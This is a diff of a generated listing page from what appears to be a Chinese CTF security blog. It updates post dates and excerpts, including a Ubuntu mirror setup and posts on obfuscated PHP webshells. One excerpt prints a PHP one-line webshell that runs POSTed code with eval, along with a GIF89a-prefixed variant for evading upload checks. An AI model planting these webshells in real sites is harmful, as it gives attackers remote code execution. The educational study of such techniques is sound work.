@@ -343,8 +343,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-08-02T20:03:25+08:00">
-                2020-08-02
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:21:50+08:00">
+                2020-11-22
               </time>
             
           </span>
@@ -410,8 +410,12 @@
 
       
         
-          <h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>阿里云Ubantu-18.04<br>因为通过官方源下载太慢了，这里使用阿里云的镜像<br>添加阿里云镜像源</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+          
+          准备工作阿里云Ubantu-18.04因为通过官方源下载太慢了，这里使用阿里云的镜像添加阿里云镜像源
+1vim /etc/apt/sources.list
+在里面添加下列源
+12345678910deb http://mirrors.aliyun.com/ubuntu/ xenial main re
+          ...
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/post/e33302b4.html#more" rel="contents">
@@ -512,8 +516,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-08-05T14:55:46+08:00">
-                2020-08-05
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:23:26+08:00">
+                2020-11-22
               </time>
             
           </span>
@@ -579,8 +583,11 @@
 
       
         
-          <p><a href="https://zxfireworks.xyz/post/e9141edc.html#SUCTF-2019-EasyWeb" target="_blank" rel="noopener">https://zxfireworks.xyz/post/e9141edc.html#SUCTF-2019-EasyWeb</a><br>做完上面这道题后，感觉有必要来学习总结一下一些特殊的webshell</p>
-<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>利用位运算符’~’对字符串进行取反操作</p>
+          
+          https://zxfireworks.xyz/post/e9141edc.html#SUCTF-2019-EasyWeb做完上面这道题后，感觉有必要来学习总结一下一些特殊的webshell
+取反利用位运算符’~’对字符串进行取反操作
+123456&lt;?php$a = urlencode(~('
+          ...
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/post/479d366b.html#more" rel="contents">
@@ -681,8 +688,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2020-07-16T19:51:39+08:00">
-                2020-07-16
+              <time title="更新于" itemprop="dateModified" datetime="2020-11-22T21:23:03+08:00">
+                2020-11-22
               </time>
             
           </span>
@@ -748,10 +755,13 @@
 
       
         
-          <p>总结一下常用的一句话木马,‘@’这个符号是为了屏蔽报错</p>
-<h3 id="PHP-eval用法和assert一样"><a href="#PHP-eval用法和assert一样" class="headerlink" title="PHP(eval用法和assert一样)"></a>PHP(eval用法和assert一样)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure>
-<p>绕过文件头检测</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+          
+          总结一下常用的一句话木马,‘@’这个符号是为了屏蔽报错
+PHP(eval用法和assert一样)1&lt;?php @eval($_POST['pass']);?&gt;
+绕过文件头检测
+12GIF89a&lt;?php @eval($_POST['pass']);?&gt;
+过滤了”&lt;?”,
+          ...
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/post/b7e0f698.html#more" rel="contents">
@@ -796,7 +806,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/">&lt;prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/4/">next&gt;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&lt;prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/4/">next&gt;</a>
   </nav>
 
 
@@ -846,7 +856,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
